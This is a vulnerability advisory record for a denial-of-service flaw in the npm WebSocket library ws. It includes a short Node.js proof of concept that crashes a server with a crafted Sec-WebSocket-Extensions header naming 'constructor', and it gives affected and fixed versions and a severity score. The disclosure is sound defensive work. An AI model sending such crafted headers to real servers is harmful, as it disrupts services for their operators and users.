advisory_id: GHSA-5v72-xg48-5rpm
datasource_id: github_osv_importer_v2/GHSA-5v72-xg48-5rpm
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2019/06/GHSA-5v72-xg48-5rpm/GHSA-5v72-xg48-5rpm.json
aliases: []
summary: |
  Denial of Service in ws
  Affected versions of `ws` can crash when a specially crafted `Sec-WebSocket-Extensions` header containing `Object.prototype` property names as extension or parameter names is sent.

  ## Proof of concept

  ```
  const WebSocket = require('ws');
  const net = require('net');

  const wss = new WebSocket.Server({ port: 3000 }, function () {
    const payload = 'constructor';  // or ',;constructor'

    const request = [
      'GET / HTTP/1.1',
      'Connection: Upgrade',
      'Sec-WebSocket-Key: test',
      'Sec-WebSocket-Version: 8',
      `Sec-WebSocket-Extensions: ${payload}`,
      'Upgrade: websocket',
      '\r\n'
    ].join('\r\n');

    const socket = net.connect(3000, function () {
      socket.resume();
      socket.write(request);
    });
  });
  ```


  ## Recommendation

  Update to version 3.3.1 or later.
impacted_packages:
  - purl: pkg:npm/ws
    affected_versions: vers:npm/>=0.2.6|<1.1.5
    fixed_versions: vers:npm/1.1.5
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:npm/ws
    affected_versions: vers:npm/>=2.0.0|<3.3.1
    fixed_versions: vers:npm/3.3.1
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2019/06/GHSA-5v72-xg48-5rpm/GHSA-5v72-xg48-5rpm.json
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-400
references:
  - url: https://github.com/websockets/ws/commit/c4fe46608acd61fbf7397eadc47378903f95b78a
    reference_type:
    reference_id:
  - url: https://github.com/websockets/ws/commit/f8fdcd40ac8be7318a6ee41f5ceb7e77c995b407
    reference_type:
    reference_id:
  - url: https://snyk.io/vuln/npm:ws:20171108
    reference_type:
    reference_id:
  - url: https://www.npmjs.com/advisories/550
    reference_type:
    reference_id:
  - url: https://www.npmjs.com/advisories/550/versions
    reference_type:
    reference_id:
